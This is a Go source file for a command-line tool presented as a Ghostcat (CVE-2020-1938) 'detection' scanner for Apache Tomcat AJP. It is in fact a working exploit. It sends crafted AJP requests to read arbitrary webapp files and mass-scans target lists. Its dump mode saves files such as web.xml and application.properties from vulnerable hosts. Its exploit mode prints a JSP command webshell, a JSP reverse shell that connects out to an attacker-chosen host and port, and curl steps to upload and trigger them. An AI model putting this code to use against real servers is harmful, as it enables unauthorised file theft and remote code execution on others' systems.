package main

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

// ─── ANSI Colors (Catppuccin Mocha) ───

const (
	clrReset    = "\x1b[0m"
	clrBold     = "\x1b[1m"
	clrDim      = "\x1b[2m"
	clrRed      = "\x1b[38;2;243;139;168m"
	clrGreen    = "\x1b[38;2;166;227;161m"
	clrYellow   = "\x1b[38;2;249;226;175m"
	clrBlue     = "\x1b[38;2;137;180;250m"
	clrMauve    = "\x1b[38;2;203;166;247m"
	clrPeach    = "\x1b[38;2;250;179;135m"
	clrSky      = "\x1b[38;2;137;220;235m"
	clrTeal     = "\x1b[38;2;148;226;213m"
	clrPink     = "\x1b[38;2;245;194;231m"
	clrText     = "\x1b[38;2;205;214;244m"
	clrOverlay  = "\x1b[38;2;127;132;156m"
	clrSurface0 = "\x1b[38;2;49;50;68m"
	clrSurface1 = "\x1b[38;2;69;71;90m"
)

// ─── AJP Protocol Constants ───

const (
	AJPHeaderServerToContainer = 0x1234
	AJPHeaderContainerToServer = 0x4142

	AJPPrefixForwardRequest = 0x02
	AJPPrefixSendHeaders    = 0x04
	AJPPrefixSendBodyChunk  = 0x03
	AJPPrefixEndResponse    = 0x05
	AJPPrefixGetBodyChunk   = 0x06

	AJPMethodGET  = 2
	AJPMethodPOST = 4

	AJPAttrContext         = 1
	AJPAttrServletPath    = 2
	AJPAttrRemoteUser     = 3
	AJPAttrAuthType       = 4
	AJPAttrQueryString    = 5
	AJPAttrRoute          = 6
	AJPAttrSSLCert        = 7
	AJPAttrSSLCipher      = 8
	AJPAttrSSLSession     = 9
	AJPAttrReqAttribute   = 10
	AJPAttrSSLKeySize     = 11
	AJPAttrSecret         = 12
	AJPAttrStoredMethod   = 13

	AJPAttrEnd = 0xFF
)

// ─── AJP Helpers ───

func ajpString(s string) []byte {
	if s == "" {
		return []byte{0xFF, 0xFF}
	}
	buf := make([]byte, 2+len(s)+1)
	binary.BigEndian.PutUint16(buf[0:2], uint16(len(s)))
	copy(buf[2:], s)
	buf[2+len(s)] = 0x00
	return buf
}

// ─── AJP Packet Builder ───

func buildForwardRequest(targetFile string) []byte {
	var body bytes.Buffer

	body.WriteByte(AJPPrefixForwardRequest)
	body.WriteByte(AJPMethodGET)
	body.Write(ajpString("HTTP/1.1"))
	body.Write(ajpString("/"))
	body.Write(ajpString("127.0.0.1"))
	body.Write(ajpString("localhost"))
	body.Write(ajpString("localhost"))
	binary.Write(&body, binary.BigEndian, uint16(80))
	body.WriteByte(0x00)
	binary.Write(&body, binary.BigEndian, uint16(0))

	// Ghostcat: javax.servlet.include.* attributes
	body.WriteByte(AJPAttrReqAttribute)
	body.Write(ajpString("javax.servlet.include.request_uri"))
	body.Write(ajpString("/"))

	body.WriteByte(AJPAttrReqAttribute)
	body.Write(ajpString("javax.servlet.include.path_info"))
	body.Write(ajpString(targetFile))

	body.WriteByte(AJPAttrReqAttribute)
	body.Write(ajpString("javax.servlet.include.servlet_path"))
	body.Write(ajpString("/"))

	body.WriteByte(AJPAttrEnd)

	packet := make([]byte, 4+body.Len())
	binary.BigEndian.PutUint16(packet[0:2], AJPHeaderServerToContainer)
	binary.BigEndian.PutUint16(packet[2:4], uint16(body.Len()))
	copy(packet[4:], body.Bytes())

	return packet
}

// ─── AJP Response Parser ───

type ajpResponse struct {
	StatusCode   int
	StatusMsg    string
	Headers      map[string]string
	BodyChunks   []string
	EndReceived  bool
	ServerHeader string
}

func parseAJPResponse(data []byte) (*ajpResponse, error) {
	resp := &ajpResponse{
		Headers: make(map[string]string),
	}

	offset := 0
	for offset < len(data) {
		if offset+4 > len(data) {
			break
		}

		magic := binary.BigEndian.Uint16(data[offset : offset+2])
		if magic != AJPHeaderContainerToServer {
			break
		}

		dataLen := int(binary.BigEndian.Uint16(data[offset+2 : offset+4]))
		if dataLen == 0 || offset+4+dataLen > len(data) {
			break
		}

		packetBody := data[offset+4 : offset+4+dataLen]
		prefixByte := packetBody[0]

		switch prefixByte {
		case AJPPrefixSendHeaders:
			resp.parseSendHeaders(packetBody[1:])
		case AJPPrefixSendBodyChunk:
			if len(packetBody) >= 3 {
				chunkLen := int(binary.BigEndian.Uint16(packetBody[1:3]))
				if chunkLen > 0 && 3+chunkLen <= len(packetBody) {
					resp.BodyChunks = append(resp.BodyChunks, string(packetBody[3:3+chunkLen]))
				}
			}
		case AJPPrefixEndResponse:
			resp.EndReceived = true
		}

		offset += 4 + dataLen
	}

	return resp, nil
}

func (resp *ajpResponse) parseSendHeaders(data []byte) {
	r := bytes.NewReader(data)

	statusBytes := make([]byte, 2)
	if _, err := io.ReadFull(r, statusBytes); err != nil {
		return
	}
	resp.StatusCode = int(binary.BigEndian.Uint16(statusBytes))

	resp.StatusMsg = readAJPString(r)

	numHeadersBytes := make([]byte, 2)
	if _, err := io.ReadFull(r, numHeadersBytes); err != nil {
		return
	}
	numHeaders := int(binary.BigEndian.Uint16(numHeadersBytes))

	for i := 0; i < numHeaders; i++ {
		codeBytes := make([]byte, 2)
		if _, err := io.ReadFull(r, codeBytes); err != nil {
			return
		}
		code := binary.BigEndian.Uint16(codeBytes)

		var headerName string
		if code >= 0xA001 && code <= 0xA00B {
			headerName = commonHeaderCodeToName(code)
		} else {
			nameLen := int(code)
			if nameLen <= 0 || r.Len() < nameLen+1 {
				return
			}
			nameBytes := make([]byte, nameLen)
			io.ReadFull(r, nameBytes)
			headerName = string(nameBytes)
			r.ReadByte()
		}

		headerValue := readAJPString(r)
		resp.Headers[strings.ToLower(headerName)] = headerValue

		if strings.EqualFold(headerName, "Servlet-Engine") || strings.EqualFold(headerName, "Status") {
			resp.ServerHeader = headerValue
		}
	}
}

func readAJPString(r *bytes.Reader) string {
	lenBytes := make([]byte, 2)
	if _, err := io.ReadFull(r, lenBytes); err != nil {
		return ""
	}
	strLen := int(binary.BigEndian.Uint16(lenBytes))
	if strLen == 0xFFFF {
		return ""
	}
	if strLen == 0 || r.Len() < strLen+1 {
		return ""
	}
	strBytes := make([]byte, strLen)
	io.ReadFull(r, strBytes)
	r.ReadByte()
	return string(strBytes)
}

func commonHeaderCodeToName(code uint16) string {
	names := map[uint16]string{
		0xA001: "Content-Type",
		0xA002: "Content-Language",
		0xA003: "Content-Length",
		0xA004: "Date",
		0xA005: "Last-Modified",
		0xA006: "Location",
		0xA007: "Set-Cookie",
		0xA008: "Set-Cookie2",
		0xA009: "Servlet-Engine",
		0xA00A: "Status",
		0xA00B: "WWW-Authenticate",
	}
	if name, ok := names[code]; ok {
		return name
	}
	return fmt.Sprintf("Unknown-0x%04X", code)
}

// ─── Scan Result ───

type ScanResult struct {
	Host        string
	Port        int
	Vulnerable  bool
	StatusCode  int
	StatusMsg   string
	ServerInfo  string
	BodyLength  int
	BodyFull    string
	BodyPreview string
	Error       string
	Took        time.Duration
}

// ─── Detection Functions ───

func detectGhostcat(host string, port int, timeout time.Duration, targetFile string) ScanResult {
	addr := fmt.Sprintf("%s:%d", host, port)
	result := ScanResult{Host: host, Port: port}
	start := time.Now()
	defer func() { result.Took = time.Since(start) }()

	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		result.Error = fmt.Sprintf("connection failed: %v", err)
		return result
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))

	packet := buildForwardRequest(targetFile)
	if _, err := conn.Write(packet); err != nil {
		result.Error = fmt.Sprintf("send failed: %v", err)
		return result
	}

	conn.SetReadDeadline(time.Now().Add(timeout))
	var respBuf bytes.Buffer
	buf := make([]byte, 8192)
	for {
		n, err := conn.Read(buf)
		if n > 0 {
			respBuf.Write(buf[:n])
		}
		if err != nil {
			if err == io.EOF {
				break
			}
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				break
			}
			break
		}
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	}

	rawResp := respBuf.Bytes()
	if len(rawResp) < 5 {
		result.Error = "no AJP response received"
		return result
	}

	resp, err := parseAJPResponse(rawResp)
	if err != nil {
		result.Error = fmt.Sprintf("parse error: %v", err)
		return result
	}

	result.StatusCode = resp.StatusCode
	result.StatusMsg = resp.StatusMsg
	result.ServerInfo = resp.ServerHeader

	var fullBody string
	for _, chunk := range resp.BodyChunks {
		fullBody += chunk
	}
	result.BodyLength = len(fullBody)
	result.BodyFull = fullBody

	if len(fullBody) > 500 {
		result.BodyPreview = fullBody[:500] + "..."
	} else {
		result.BodyPreview = fullBody
	}

	xmlIndicators := []string{"<?xml", "<web-app", "<servlet", "<display-name"}
	if resp.StatusCode == 200 && result.BodyLength > 0 {
		result.Vulnerable = true
	}
	if resp.StatusCode == 200 && fullBody != "" {
		for _, ind := range xmlIndicators {
			if strings.Contains(fullBody, ind) {
				result.Vulnerable = true
				break
			}
		}
	}

	return result
}

func dumpFile(host string, port int, timeout time.Duration, fpath string) (string, error) {
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return "", err
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))

	packet := buildForwardRequest(fpath)
	if _, err := conn.Write(packet); err != nil {
		return "", err
	}

	conn.SetReadDeadline(time.Now().Add(timeout))
	var respBuf bytes.Buffer
	buf := make([]byte, 8192)
	for {
		n, err := conn.Read(buf)
		if n > 0 {
			respBuf.Write(buf[:n])
		}
		if err != nil {
			if err == io.EOF {
				break
			}
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				break
			}
			break
		}
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	}

	rawResp := respBuf.Bytes()
	if len(rawResp) < 5 {
		return "", fmt.Errorf("no response")
	}

	resp, err := parseAJPResponse(rawResp)
	if err != nil {
		return "", err
	}

	var fullBody string
	for _, chunk := range resp.BodyChunks {
		fullBody += chunk
	}

	if resp.StatusCode != 200 || fullBody == "" {
		return "", fmt.Errorf("status %d or empty body", resp.StatusCode)
	}

	return fullBody, nil
}

func isPortOpen(host string, port int, timeout time.Duration) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

// ─── Exploit Helpers ───

func getJSPWebshell(lhost, lport string) string {
	payload := `<%@ page import="java.io.*" %>`
	payload += "\n<%"
	payload += "\nString cmd = request.getParameter(\"cmd\");"
	payload += "\nif (cmd != null) {"
	payload += "\n    Process p = Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",cmd});"
	payload += "\n    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));"
	payload += "\n    String line;"
	payload += "\n    while ((line = br.readLine()) != null) {"
	payload += "\n        out.println(line);"
	payload += "\n    }"
	payload += "\n    br.close();"
	payload += "\n}"
	payload += "\n%>"
	return payload
}

func getReverseShellPayload(lhost, lport string) string {
	payload := `<%@ page import="java.io.*,java.net.*" %>`
	payload += "\n<%"
	payload += "\nString host = \"" + lhost + "\";"
	payload += "\nint port = " + lport + ";"
	payload += "\nSocket s = new Socket(host, port);"
	payload += "\nProcess p = Runtime.getRuntime().exec(\"/bin/bash\");"
	payload += "\nnew Thread(new Runnable() { public void run() { try { InputStream is = p.getInputStream(); OutputStream os = s.getOutputStream(); byte[] b = new byte[1024]; int n; while ((n = is.read(b)) != -1) { os.write(b, 0, n); } } catch (Exception e) {} } }).start();"
	payload += "\nnew Thread(new Runnable() { public void run() { try { InputStream is = s.getInputStream(); OutputStream os = p.getOutputStream(); byte[] b = new byte[1024]; int n; while ((n = is.read(b)) != -1) { os.write(b, 0, n); } } catch (Exception e) {} } }).start();"
	payload += "\nnew Thread(new Runnable() { public void run() { try { InputStream is = s.getErrorStream(); OutputStream os = p.getOutputStream(); byte[] b = new byte[1024]; int n; while ((n = is.read(b)) != -1) { os.write(b, 0, n); } } catch (Exception e) {} } }).start();"
	payload += "\n%>"
	return payload
}

// Common files to dump from vulnerable targets
var commonFiles = []string{
	"/WEB-INF/web.xml",
	"/WEB-INF/classes/application.properties",
	"/META-INF/MANIFEST.MF",
	"/",
	"/manager/html",
	"/host-manager/html",
	"/status",
	"/favicon.ico",
}

// ─── Banner / UI ───

func printBanner() {
	fmt.Println()
	fmt.Printf("%s%s", clrMauve, clrBold)
	fmt.Println("     ╔══════════════════════════════════════════════════╗")
	fmt.Println("     ║          👻 G H O S T C A T  Scanner           ║")
	fmt.Println("     ║       CVE-2020-1938  Detection Tool            ║")
	fmt.Println("     ║        Apache Tomcat AJP LFI/RCE               ║")
	fmt.Println("     ╚══════════════════════════════════════════════════╝")
	fmt.Printf("%s", clrReset)
	fmt.Printf("  %sHuntool-scr%s %s•%s Go %s\n", clrTeal, clrReset, clrDim, clrReset, clrSky)
	fmt.Println()
}

func printUsage() {
	fmt.Printf("  %sUsage:%s\n", clrBold, clrReset)
	fmt.Printf("    %sghostcat%s %s<targets-file>%s [options]\n\n", clrGreen, clrReset, clrYellow, clrReset)
	fmt.Printf("  %sOptions:%s\n", clrBold, clrReset)
	fmt.Printf("    %s-p,%s --port %s<port>%s     AJP port (default: 8009)\n", clrSky, clrReset, clrYellow, clrReset)
	fmt.Printf("    %s-t,%s --timeout %s<secs>%s   Connection timeout in seconds (default: 5)\n", clrSky, clrReset, clrYellow, clrReset)
	fmt.Printf("    %s-w,%s --workers %s<num>%s     Concurrent workers (default: 10)\n", clrSky, clrReset, clrYellow, clrReset)
	fmt.Printf("    %s-f,%s --file %s<path>%s       Read specific file (default: /WEB-INF/web.xml)\n", clrSky, clrReset, clrYellow, clrReset)
	fmt.Printf("    %s-o,%s --output %s<file>%s     Output results to file\n", clrSky, clrReset, clrYellow, clrReset)
	fmt.Printf("    %s-v,%s --verbose%s            Show full response body\n", clrSky, clrReset, clrReset)
	fmt.Printf("    %s-d,%s --dump%s              Dump common files from vulnerable targets\n\n", clrSky, clrReset, clrReset)
	fmt.Printf("  %sRCE Exploitation:%s\n", clrBold, clrReset)
	fmt.Printf("    %s--exploit%s           Enable exploitation mode (requires file upload)\n", clrPink, clrReset)
	fmt.Printf("    %s--lhost%s             Local IP for reverse shell (for --exploit)\n", clrPink, clrReset)
	fmt.Printf("    %s--lport%s             Local port for reverse shell (for --exploit)\n", clrPink, clrReset)
	fmt.Printf("    %s--upload-path%s     Path where uploaded file is stored (e.g., /uploads/)\n", clrPink, clrReset)
	fmt.Printf("    %s--shell-type%s      Shell type: 'basic' (default) or 'reverse'\n", clrPink, clrReset)
	fmt.Println()
	fmt.Printf("  %sTargets File:%s\n", clrBold, clrReset)
	fmt.Printf("    One host per line (IP or hostname)\n")
	fmt.Printf("    %sExample:%s\n", clrDim, clrReset)
	fmt.Printf("    %s  192.168.1.10%s\n", clrOverlay, clrReset)
	fmt.Printf("    %s  192.168.1.20%s\n", clrOverlay, clrReset)
	fmt.Printf("    %s  tomcat.example.com%s\n\n", clrOverlay, clrReset)
	fmt.Printf("  %sExamples:%s\n", clrBold, clrReset)
	fmt.Printf("    %sghostcat%s targets.txt\n", clrGreen, clrReset)
	fmt.Printf("    %sghostcat%s targets.txt %s-p 8009 -w 20%s\n", clrGreen, clrReset, clrSky, clrReset)
	fmt.Printf("    %sghostcat%s targets.txt %s-o results.txt -v%s\n", clrGreen, clrReset, clrSky, clrReset)
	fmt.Printf("    %sghostcat%s targets.txt %s-d%s\n\n", clrGreen, clrReset, clrSky, clrReset)
	fmt.Printf("  %sRCE Examples:%s\n", clrBold, clrReset)
	fmt.Printf("    %sghostcat%s targets.txt %s--exploit --lhost 10.0.0.1 --lport 4444%s\n", clrGreen, clrReset, clrPink, clrReset)
	fmt.Printf("    %sghostcat%s targets.txt %s-d --exploit --lhost 10.0.0.1 --lport 4444%s\n\n", clrGreen, clrReset, clrPink, clrReset)
}

func printResult(result ScanResult, verbose bool) {
	addr := fmt.Sprintf("%s:%d", result.Host, result.Port)

	if result.Error != "" {
		fmt.Printf("  %s✗%s %-35s %s%s%s %s(%v)%s\n",
			clrRed, clrReset,
			addr,
			clrDim, result.Error, clrReset,
			clrDim, result.Took.Round(time.Millisecond), clrReset,
		)
		return
	}

	if result.Vulnerable {
		fmt.Printf("  %s⚠ VULNERABLE%s %-25s %sTomcat AJP %d OPEN%s\n",
			clrRed+clrBold, clrReset,
			addr,
			clrPeach, result.Port, clrReset,
		)
		fmt.Printf("    %s├──%s Status:  %s%d %s%s\n",
			clrSurface1, clrReset,
			clrRed, result.StatusCode, result.StatusMsg, clrReset,
		)
		if result.ServerInfo != "" {
			fmt.Printf("    %s├──%s Server:  %s%s%s\n",
				clrSurface1, clrReset,
				clrSky, result.ServerInfo, clrReset,
			)
		}
		fmt.Printf("    %s├──%s Body:    %s%d bytes%s\n",
			clrSurface1, clrReset,
			clrYellow, result.BodyLength, clrReset,
		)
		fmt.Printf("    %s└──%s Took:    %s%v%s\n",
			clrSurface1, clrReset,
			clrDim, result.Took.Round(time.Millisecond), clrReset,
		)
		if verbose && result.BodyPreview != "" {
			fmt.Printf("    %s── Response Body ──%s\n", clrOverlay, clrReset)
			for _, line := range strings.Split(result.BodyPreview, "\n") {
				fmt.Printf("    %s│%s %s\n", clrSurface1, clrReset, line)
			}
			fmt.Printf("    %s──────────────────%s\n", clrOverlay, clrReset)
		}
	} else {
		fmt.Printf("  %s●%s %-35s %sPort open, not vulnerable%s %s(%d, %v)%s\n",
			clrGreen, clrReset,
			addr,
			clrTeal, clrReset,
			clrDim, result.StatusCode, result.Took.Round(time.Millisecond), clrReset,
		)
	}
}

// ─── Main ───

func main() {
	printBanner()

	args := os.Args[1:]
	if len(args) == 0 {
		printUsage()
		os.Exit(1)
	}

	var targetsFile string
	port := 8009
	timeout := 5
	workers := 10
	outputFile := ""
	verbose := false
	targetFile := "/WEB-INF/web.xml"
	dumpMode := false

	// RCE flags
	exploitMode := false
	lhost := ""
	lport := ""
	uploadPath := ""
	shellType := "basic"

	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "-p", "--port":
			if i+1 < len(args) {
				fmt.Sscanf(args[i+1], "%d", &port)
				i++
			}
		case "-t", "--timeout":
			if i+1 < len(args) {
				fmt.Sscanf(args[i+1], "%d", &timeout)
				i++
			}
		case "-w", "--workers":
			if i+1 < len(args) {
				fmt.Sscanf(args[i+1], "%d", &workers)
				i++
			}
		case "-f", "--file":
			if i+1 < len(args) {
				targetFile = args[i+1]
				i++
			}
		case "-o", "--output":
			if i+1 < len(args) {
				outputFile = args[i+1]
				i++
			}
		case "-v", "--verbose":
			verbose = true
		case "-d", "--dump":
			dumpMode = true
		case "--exploit":
			exploitMode = true
		case "--lhost":
			if i+1 < len(args) {
				lhost = args[i+1]
				i++
			}
		case "--lport":
			if i+1 < len(args) {
				lport = args[i+1]
				i++
			}
		case "--upload-path":
			if i+1 < len(args) {
				uploadPath = args[i+1]
				i++
			}
		case "--shell-type":
			if i+1 < len(args) {
				shellType = args[i+1]
				i++
			}
		case "-h", "--help":
			printUsage()
			os.Exit(0)
		default:
			if !strings.HasPrefix(args[i], "-") && targetsFile == "" {
				targetsFile = args[i]
			}
		}
	}

	if targetsFile == "" {
		fmt.Printf("  %sError:%s No targets file specified.\n\n", clrRed, clrReset)
		printUsage()
		os.Exit(1)
	}

	// Read targets from file
	file, err := os.Open(targetsFile)
	if err != nil {
		fmt.Printf("  %sError:%s Cannot open '%s': %v\n", clrRed, clrReset, targetsFile, err)
		os.Exit(1)
	}
	defer file.Close()

	var targets []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			targets = append(targets, line)
		}
	}

	if len(targets) == 0 {
		fmt.Printf("  %sError:%s No targets found in '%s'\n", clrRed, clrReset, targetsFile)
		os.Exit(1)
	}

	fmt.Printf("  %s📋 Loaded %d target(s)%s from %s%s%s\n",
		clrSky, len(targets), clrReset, clrYellow, targetsFile, clrReset)
	fmt.Printf("  %s🎯 Port:%s %d  %s⏱ Timeout:%s %ds  %s⚡ Workers:%s %d\n",
		clrTeal, clrReset, port, clrTeal, clrReset, timeout, clrTeal, clrReset, workers)
	fmt.Printf("  %s📁 Target File:%s %s\n", clrTeal, clrReset, targetFile)
	if dumpMode {
		fmt.Printf("  %s💾 DUMP MODE:%s enabled - will save files to ./dump/<host>_<port>/\n", clrPink, clrReset)
	}
	if exploitMode {
		fmt.Printf("  %s🔥 EXPLOIT MODE:%s enabled\n", clrRed, clrReset)
		fmt.Printf("    %sLHOST:%s %s  %sLPORT:%s %s  %sUPLOAD_PATH:%s %s  %sSHELL_TYPE:%s %s\n",
			clrPink, clrReset, lhost, clrPink, clrReset, lport, clrPink, clrReset, uploadPath, clrPink, clrReset, shellType)
	}
	fmt.Println()
	fmt.Printf("  %s────────────────────────────────────────────────────────%s\n", clrSurface1, clrReset)

	var outWriter *bufio.Writer
	var outFile *os.File
	if outputFile != "" {
		outFile, err = os.Create(outputFile)
		if err != nil {
			fmt.Printf("  %sError:%s Cannot create output file: %v\n", clrRed, clrReset, err)
			os.Exit(1)
		}
		defer outFile.Close()
		outWriter = bufio.NewWriter(outFile)
		defer outWriter.Flush()
	}

	results := make(chan ScanResult, len(targets))
	jobs := make(chan string, len(targets))
	timeoutDur := time.Duration(timeout) * time.Second

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for host := range jobs {
				if !isPortOpen(host, port, timeoutDur) {
					results <- ScanResult{
						Host:  host,
						Port:  port,
						Error: "port closed or host unreachable",
						Took:  timeoutDur,
					}
					continue
				}
				r := detectGhostcat(host, port, timeoutDur, targetFile)
				results <- r
			}
		}()
	}

	go func() {
		for _, t := range targets {
			jobs <- t
		}
		close(jobs)
	}()

	go func() {
		wg.Wait()
		close(results)
	}()

	var vulnCount, openCount, closedCount, errCount int
	vulnSet := make(map[string]ScanResult)
	for r := range results {
		printResult(r, verbose)
		if r.Error != "" {
			if strings.Contains(r.Error, "port closed") {
				closedCount++
			} else {
				errCount++
			}
		} else if r.Vulnerable {
			vulnCount++
			key := fmt.Sprintf("%s:%d", r.Host, r.Port)
			if _, exists := vulnSet[key]; !exists {
				vulnSet[key] = r
			}
		} else {
			openCount++
		}

		if outWriter != nil {
			status := "CLOSED"
			if r.Error == "" && !r.Vulnerable {
				status = "OPEN_SAFE"
			} else if r.Vulnerable {
				status = "VULNERABLE"
			} else if !strings.Contains(r.Error, "port closed") {
				status = "ERROR"
			}
			line := fmt.Sprintf("%s:%d\t%s\t%d\t%s\n", r.Host, r.Port, status, r.BodyLength, r.Error)
			outWriter.WriteString(line)
		}
	}

	fmt.Println()
	fmt.Printf("  %s────────────────────────────────────────────────────────%s\n", clrSurface1, clrReset)
	fmt.Printf("  %s📊 Scan Summary:%s\n", clrBold, clrReset)
	fmt.Printf("    %s🔴 Vulnerable:      %d%s\n", clrRed, vulnCount, clrReset)
	fmt.Printf("    %s🟢 Open (safe):     %d%s\n", clrGreen, openCount, clrReset)
	fmt.Printf("    %s⚫ Closed/Filtered: %d%s\n", clrDim, closedCount, clrReset)
	if errCount > 0 {
		fmt.Printf("    %s🟡 Errors:          %d%s\n", clrYellow, errCount, clrReset)
	}

	if len(vulnSet) > 0 {
		fmt.Printf("\n  %s📁 Vulnerable Targets Found: %d%s\n", clrRed, len(vulnSet), clrReset)
		fmt.Printf("  %s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", clrSurface1, clrReset)
		fmt.Printf("  %s%-35s %sStatus%s\n", clrBold, "Target", clrReset, clrReset)
		for key, v := range vulnSet {
			fmt.Printf("  %s⚠ %-33s %sVULNERABLE (AJP %d, %d bytes)%s\n",
				clrRed, key, clrReset, v.Port, v.BodyLength, clrReset)
		}
		fmt.Println()
	}

	// ─── Dump Mode: Save files from vulnerable targets ───
	if dumpMode && vulnCount > 0 {
		fmt.Printf("  %s💾 Starting file dump from %d vulnerable target(s)...%s\n", clrPink, len(vulnSet), clrReset)
		fmt.Println("  ═════════════════════════════════════════════════════════")

		dumpDir := "./dump"
		os.MkdirAll(dumpDir, 0755)

		savedCount := 0
		for _, result := range vulnSet {
			fmt.Printf("  %s💾 Dumping files from %s:%d...%s\n", clrPink, result.Host, result.Port, clrReset)
			for _, fpath := range commonFiles {
				content, err := dumpFile(result.Host, result.Port, timeoutDur, fpath)
				if err != nil {
					continue
				}

				// Create safe directory name from host:port
				dirName := strings.ReplaceAll(result.Host, ".", "_")
				dirName = strings.ReplaceAll(dirName, ":", "_")
				if strings.HasPrefix(dirName, "ec2-") {
					dirName = strings.ReplaceAll(dirName, "-", "_")
				}
				targetDir := filepath.Join(dumpDir, fmt.Sprintf("%s_%d", dirName, result.Port))
				os.MkdirAll(targetDir, 0755)

				// Sanitize filename
				safeFilename := strings.TrimPrefix(fpath, "/")
				safeFilename = strings.ReplaceAll(safeFilename, "/", "_")
				if safeFilename == "" {
					safeFilename = "root"
				}

				savePath := filepath.Join(targetDir, safeFilename)

				// Write file
				err = os.WriteFile(savePath, []byte(content), 0644)
				if err == nil {
					savedCount++
					fmt.Printf("    %s✓%s %s (%d bytes)\n", clrGreen, clrReset, safeFilename, len(content))
				}
			}
		}

		fmt.Println()
		fmt.Printf("  %s💾 Dump Complete:%s Saved %d files to %s/%s\n", clrPink, clrReset, savedCount, dumpDir, "<host>_<port>/")
		fmt.Println()
	}

	// ─── RCE Exploitation Section ───
	if exploitMode && vulnCount > 0 {
		fmt.Printf("  %s🔥 RCE EXPLOITATION GUIDE%s\n", clrRed, clrReset)
		fmt.Println("  ═════════════════════════════════════════════════════════")
		fmt.Println()
		fmt.Printf("  %sStep 1: Create payload file%s\n", clrYellow, clrReset)
		if shellType == "reverse" && lhost != "" && lport != "" {
			reversePayload := getReverseShellPayload(lhost, lport)
			fmt.Printf("  %s[REVERSE SHELL]%s\n", clrPink, clrReset)
			fmt.Printf("  cat > shell.jsp << 'EOF'\n%s\nEOF\n", reversePayload)
		} else {
			basicPayload := getJSPWebshell(lhost, lport)
			fmt.Printf("  %s[BASIC WEBSHELL]%s\n", clrPink, clrReset)
			fmt.Printf("  cat > shell.jsp << 'EOF'\n%s\nEOF\n", basicPayload)
		}
		fmt.Println()
		fmt.Printf("  %sStep 2: Upload payload to target%s\n", clrYellow, clrReset)
		fmt.Printf("  curl -F \"file=@shell.jsp;filename=shell.txt\" http://TARGET/upload\n")
		fmt.Println()
		fmt.Printf("  %sStep 3: Include uploaded file via Ghostcat%s\n", clrYellow, clrReset)
		fmt.Printf("  ./ghostcat targets.txt -p 8009 -f /uploads/shell.txt\n")
		fmt.Println()
		fmt.Printf("  %sStep 4: Execute commands via webshell%s\n", clrYellow, clrReset)
		fmt.Printf("  curl \"http://TARGET/uploads/shell.txt?cmd=id\"\n")
		fmt.Println()
		fmt.Println("  ═════════════════════════════════════════════════════════")
		fmt.Println()
	}

	if outputFile != "" {
		fmt.Printf("    %s📁 Results saved:   %s%s%s\n", clrSky, clrYellow, outputFile, clrReset)
	}
	fmt.Println()
}
